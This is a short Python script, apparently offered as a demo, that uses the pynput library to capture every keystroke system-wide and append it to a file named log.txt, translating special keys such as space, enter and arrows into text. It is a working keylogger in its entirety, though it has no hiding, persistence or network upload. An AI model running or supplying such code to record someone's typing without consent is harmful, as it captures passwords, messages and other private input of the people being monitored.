from pynput.keyboard import Listener

# Map special keys to their actual text representation
special_keys = {
    'Key.space': ' ',
    'Key.enter': '\n',
    'Key.tab': '\t',
    'Key.backspace': '[BACKSPACE]',  # You can't "write" a backspace, so mark it
    'Key.delete': '[DELETE]',
    'Key.esc': '[ESC]',
    'Key.shift': '',
    'Key.shift_r': '',
    'Key.ctrl_l': '',
    'Key.ctrl_r': '',
    'Key.alt_l': '',
    'Key.alt_r': '',
    'Key.cmd': '',  # Windows key / Command key
    'Key.up': '[UP]',
    'Key.down': '[DOWN]',
    'Key.left': '[LEFT]',
    'Key.right': '[RIGHT]',
}

def write_to_file(key):
    letter = str(key).replace("'", "")  # Convert 'a' -> a, 'Key.space' -> Key.space
    
    # If it's a mapped special key, use the mapped value
    if letter in special_keys:
        letter = special_keys[letter]
    
    # If it's still a "Key." prefix but not in our dict, skip it entirely
    if letter.startswith('Key.'):
        return  # Ignores unknown function keys (F1, F2, etc.)
    
    # Write to file (opening in 'a' mode is okay for a demo, 
    # but for high-speed typing, batching is better)
    with open("log.txt", 'a', encoding='utf-8') as f:
        f.write(letter)

# Start the listener
with Listener(on_press=write_to_file) as listener:
    listener.join()
